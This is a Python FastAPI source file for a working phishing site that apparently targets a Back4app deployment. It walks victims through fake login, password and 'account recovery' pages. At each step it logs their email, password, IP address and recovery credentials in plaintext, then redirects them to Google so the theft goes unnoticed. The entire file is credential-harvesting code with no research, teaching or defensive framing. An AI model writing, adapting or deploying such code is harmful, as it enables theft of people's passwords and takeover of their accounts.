from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
import logging
import os
import uvicorn

# --- Configuration ---
app = FastAPI()


# This creates the absolute path to your templates folder
template_dir = os.path.join(os.path.dirname(__file__), "templates")
templates = Jinja2Templates(directory=template_dir)

# Setup logging to print to console (visible in Back4app logs)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# --- Routes ---
@app.get("/", response_class=HTMLResponse)
async def show_login_form(request: Request):
    """Step 1: Show the initial login form."""
    return templates.TemplateResponse("index.html", {"request": request})

@app.post("/check-email")
async def handle_email(request: Request, email: str = Form(...)):
    """Step 1: Process the email and log it."""
    client_ip = request.client.host if request.client else "IP_UNKNOWN"
    
    # PRINT CREDENTIALS - This will appear in Back4app logs
    logger.info(f"📧 EMAIL RECEIVED | IP: {client_ip} | Email: '{email}'")
    print(f"[CREDENTIAL] Email: {email}")  # Additional print for visibility
    
    # Store email in a cookie and proceed to password page
    response = RedirectResponse(url="/password", status_code=303)
    response.set_cookie(key="user_email", value=email)
    return response

@app.get("/password", response_class=HTMLResponse)
async def show_password_form(request: Request):
    """Step 2: Show the password form with the email displayed."""
    email = request.cookies.get("user_email", "user@example.com")
    return templates.TemplateResponse("password.html", {"request": request, "email": email})

@app.post("/check-password")
async def handle_password(request: Request, password: str = Form(...)):
    """Step 2: Process the password and log it with the associated email."""
    client_ip = request.client.host if request.client else "IP_UNKNOWN"
    email = request.cookies.get("user_email", "EMAIL_UNKNOWN")
    
    # PRINT CREDENTIALS - This will appear in Back4app logs
    logger.info(f"🔑 PASSWORD RECEIVED | IP: {client_ip} | For: '{email}' | Password: '{password}'")
    print(f"[CREDENTIAL] For {email} | Password: {password}")  # Additional print
    
    # Proceed to recovery page
    return RedirectResponse(url="/recovery", status_code=303)

@app.get("/recovery", response_class=HTMLResponse)
async def show_recovery_form(request: Request):
    """Step 3: Show the recovery email/password form."""
    return templates.TemplateResponse("recovery.html", {"request": request})

@app.post("/process-recovery")
async def handle_recovery(
    request: Request, 
    recovery_email: str = Form(...), 
    recovery_password: str = Form(...)
):
    """Step 3: Process recovery credentials and log everything."""
    client_ip = request.client.host if request.client else "IP_UNKNOWN"
    main_email = request.cookies.get("user_email", "MAIN_EMAIL_UNKNOWN")
    
    # PRINT ALL CREDENTIALS - This will appear in Back4app logs
    logger.info(f"🛡️ RECOVERY DATA | IP: {client_ip} | Main: '{main_email}' | Recovery Email: '{recovery_email}' | Recovery Password: '{recovery_password}'")
    print(f"[CREDENTIAL] Main: {main_email} | Recovery Email: {recovery_email} | Recovery Password: {recovery_password}")  # Additional print
    
    # Clear the cookie and redirect to Google (or any final page)
    response = RedirectResponse(url="https://www.google.com", status_code=307)
    response.delete_cookie(key="user_email")
    return response

# --- Application Entry Point (Crucial for Back4app) ---
if __name__ == "__main__":
    # Read the PORT environment variable provided by Back4app, default to 8080
    port = int(os.environ.get("PORT", 8080))
    # Start the server. REMOVE 'reload=True' for production.
    uvicorn.run("main:app", host="0.0.0.0", port=port)
